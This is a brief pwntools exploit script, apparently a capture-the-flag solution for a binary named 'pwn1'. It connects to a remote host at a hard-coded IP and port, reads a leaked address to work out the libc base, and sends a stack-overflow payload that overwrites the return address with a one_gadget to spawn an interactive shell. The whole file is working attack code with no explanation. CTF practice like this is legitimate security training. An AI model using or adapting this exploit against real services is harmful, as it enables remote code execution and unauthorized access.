from pwn import *

#p = process('./pwn1')
p = remote("124.16.75.117", 51005)
#libc = ELF("./libc.so.6")
one_gadget = 0x10a41c
context.log_level = "debug"

p.sendline("1200") 

recv_data = p.recvuntil('\n').split(' ')[-1]
libc_base = int(recv_data, 16) - 0x407A0
print "LIBC_BASE:",hex(libc_base)

payload = 'a'*0x110 + p64(0) + p64(libc_base + one_gadget) + p64(0)
#gdb.attach(p)
#pause()
p.sendline(payload)

p.interactive()
